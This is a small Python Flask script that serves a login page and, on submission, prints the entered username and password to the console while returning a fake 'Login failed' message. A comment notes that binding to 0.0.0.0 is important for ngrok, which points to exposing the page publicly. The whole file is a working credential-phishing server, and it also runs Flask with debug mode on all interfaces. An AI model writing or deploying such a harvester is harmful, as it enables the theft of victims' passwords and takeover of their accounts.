from flask import Flask, request, render_template

app = Flask(__name__)


@app.route('/')
def home():
    return render_template('login.html')  # Make sure login.html is in a 'templates' folder


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Log or save the credentials (for testing purposes)
    print(f"[+] Username: {username}")
    print(f"[+] Password: {password}")

    # You can redirect or show a fake error message
    return "Login failed. Please try again later."


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)  # <<< THIS IS IMPORTANT FOR NGROK
